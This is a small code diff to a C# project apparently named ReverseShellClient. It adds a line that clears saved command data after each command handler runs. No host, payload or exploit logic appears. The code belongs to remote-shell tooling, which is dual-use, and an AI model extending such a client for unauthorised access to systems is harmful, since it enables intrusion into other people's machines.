@@ -73,6 +73,7 @@ namespace ReverseShellClient
                     {
                         // Call client method
                         command.ClientMethod(null);
+                        command.savedData?.Clear();
                         processingCommand = false;
                     }
                     else
@@ -204,6 +205,7 @@ namespace ReverseShellClient
                             try
                             {
                                 command.ClientMethod(arguments);
+                                command.savedData?.Clear();
                                 GlobalNetworkManager.SayHello();
                                 continue;
                             }
